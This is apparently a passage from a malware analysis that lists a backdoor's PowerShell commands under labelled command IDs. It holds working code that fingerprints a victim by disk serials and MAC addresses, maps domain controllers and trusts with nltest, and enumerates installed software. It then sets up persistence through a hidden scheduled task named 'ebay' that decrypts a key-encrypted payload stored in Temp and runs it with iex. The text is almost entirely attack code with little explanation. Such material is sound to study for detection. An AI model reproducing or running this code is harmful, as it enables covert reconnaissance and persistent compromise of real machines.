I. Enumerate MAC address of the victim

cmd=c4673448-31a5-11ea-9460-bad1eec1146e

$obj = Get-WmiObject Win32_logicaldisk | Select-Object volumeserialnumber;
$obj | foreach-object { $serials = $serials + $_.volumeserialnumber }
$macs = Get-WmiObject win32_networkadapterconfiguration | select macaddress
$macs | foreach-object { $maclist += $_.macaddress }
$data = $serials + $env:NUMBER_OF_PROCESSORS + $env:PROCESSOR_ARCHITECTURE + $env:PROCESSOR_IDENTIFIER + $env:PROCESSOR_LEVEL + $maclist

II. Caller request

cmd=babdf584-326c-11ea-9460-bad1eec1146e

III. Reconnaissance request

cmd=0cf9a6a9-ca7b-11ea-8712-bad1eec1146e

$obj = Get-WmiObject -Class Win32_NetworkAdapterConfiguration -Filter IPEnabled=TRUE -ComputerName . 
$obj = $obj | Select-Object DHCPEnabled,IPAddress,DefaultIPGateway,DNSDomain,ServiceName,Description,Index;
$domain = $env:USERDOMAIN
$dclist = nltest.exe /DCLIST:$domain
$dtrust = nltest.exe /domain_trusts
$obj | Add-Member -MemberType NoteProperty -Name dclist -Value $dclist
$obj | Add-Member -MemberType NoteProperty -Name dtrust -Value $dtrust

IV. Software installed request

cmd=f8793903-3272-11ea-9460-bad1eec1146e

$software = Get-ItemProperty HKLM:\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\* | Select-Object DisplayName, DisplayVersion, Publisher, InstallDate
$info = ($software | ConvertTo-Xml -AS String -Depth 1 -NoTypeInformation)

V.  Persistence via Task Scheduler and â€œmarshaling" 

$nAfNXil = '76492d1116743f0423413b16050a5345MgB8AEIATQA5ADcAMABSAGIAbQBDAHAATwBBAFcANwBGAHcAbQA1ADcATQBnAGcAPQA9AHwAZAAyADIAYwA0ADIAMAAxADUANAAwADMANAAzADMAMAAxADgAYQBlAGMAZgA3ADUANwBjADYAZAAxAGEAYwAwADAAOQAxADYAZQBhADkAMgAxADQANwA1ADMANAA1ADAAZAAwADgANwBkADQAZgBmADIAZAA3ADAAZAA3ADcAMgA3AGMANAA5ADQAZABkADAAOABlADUANgA0ADkAZABiAGMAMwAyAGYAMgBiADQAOQA0ADMANwBjADkAMQA4AGEAOQA0ADMAOAA2AGYANQBhADIAMQBiADAAYwA5ADQAMgBmAGMAMgA1ADAAMwAxADcAYQBiAGEAZQBjADIANwBkADYANAA1AGEAOQBhAGQANgA0AGQANgBmAGYAMgAzAGQAMwA5ADIAMgBiADgAYQAzAGMAYQBjAGMAZgBkAGUANwAyAGIAZgBiADkAZABjAGMAOQBlAGEAOAAzADcAMwBmAGYAMwBiAGIANAA1AGUAMQBkADYANQA4AGMAOQAzAGYAMAA5ADAAOABiADgANQBlAGUAMwA0AGQAMQBhADkAZQA3ADAAMwBmADEAOAA1ADMAYQBlAGEAMQA5AGUANgA5ADYANwBjADcANABkADkAMABjADIAZQBlAGIAZQBhADEAZQA0ADcANwA0ADIANQAxADgAZQA2ADUAZABiADkANwA4ADgAOAAwAGQAMwBkAGMANQBiAGMAOQBmADkAYwAyADIAZQBiADAANgBkAGUAYwAyAGYAOQBjAGIANwAwADIAZgA4ADAAZgAzADQANwA1ADcAYQAxADIAOABmADIANAAwADIANAA2AGMANQA0ADMAOABhAGIAZQBlADAAYgA4AGUANABlAGQAZQA5ADAAMgBlADEAMABhAGYAYwBlADUAZAAxAGQANwA3ADUAZQBhAGUAYwAyAGEAYwA1ADIAOABjADgAYQBkAGYAMQAzADAAOQA1ADkAOQA3ADQANwBlAGUANQAxAGYAYgBmADYAMgBjADEANgBhADQAZQAwAGIAZgBiADUAZABjAGUAMQA3ADAANwA5ADUAZQBkADcANgA4AGYANwA0AGEANQBjADUAMwA3ADEAMgAwADcANAA1ADMAMQBhADkANgA3ADcANgBlADcAZQBlADQANQAxAGEANQAzAGIAOQBkAGIANAAxADAAMQBiAGUAYwA0ADIAMgA0ADQAZAA0ADAAZgAxADAANQBkADkAOABkAGMAZgAyADAAYgBjAGMANAA2AGYAZgBiADMANgBlAGEANgAxADQAOAAyADcAZQA1ADUAZQBhAGQAYwAyAGQAZAA0AGMAMAA2AGUAZQAxADEANgA2ADYAZAA4AGUAYQA1ADkANAAyADgAYwA2ADMANwAwAGMAZgBkADIAZgA0ADkAMAA1AGUAMABjADgAYQBiADYAMgBiAGUAZAA3ADAAYgBkAGIAOQBmAGEAMwA3ADkANgA5ADIANAA0AGMANABlAGYANgBiAGIAZgA3ADAAZQA1ADUAZQA3ADcAYQA1AGEAYwAyAGUAZgA4AGEAYgA2AGMANgAwADgAMwBjADAAMwBlADAANwAyADMAYwAwADcANABiADQANAA5AGEAYwA0ADMAZAAxADMANQA4AGQAYwA3ADgANABmADMANgA5ADUAYwA1ADUAYgA4AGMANABmADMAYwA1AGEAMQBjAGYANgBjADUAMAAwAGEANABlADQANwAzAGMAZQA3ADEAYQA3AGQAYQAxADQAZQA1AGEAMgAwAGYAZAAxADMAMQBkADYAYwAyADQAOAAxADAAOAAwADYANwA4AGIAYQA1ADMAOAA5AGYAYQA4AGUAOAA5ADUANAA1AGIANwAzAGQAYQBhADUANAA0ADcAYwBjAGIANwAzADMAMwBiAGEAMABkADYAYgA1ADcAMAA5ADcAMQBlAGIAMgBiADEAMgAwADIAYQBhAGYAZgA=';$RGVVaQ3 = @(59,22,183,219,3,88,227,206,174,203,184,14,178,164,166,196);$nAfNXil | Out-File -FilePath $env:LOCALAPPDATA\Temp\AffirmTrust.txt; 'param($5ZErpxNF, $RGVVaQ3); [runtime.interopservices.marshal]::PtrToStringBSTR([runtime.interopservices.marshal]::securestringtobstr($(Get-Content -Raw -Path $5ZErpxNF | ConvertTo-SecureString -Key $RGVVaQ3;)))' | Out-File $env:LOCALAPPDATA\Temp\Actalis.ps1;schtasks /create /sc minute /mo 420 /tn ebay /tr "powershell -WindowStyle Hidden  -C $env:LOCALAPPDATA\Temp\Actalis.ps1 -5ZErpxNF $env:LOCALAPPDATA\Temp\AffirmTrust.txt -RGVVaQ3 59,22,183,219,3,88,227,206,174,203,184,14,178,164,166,196 | iex;"
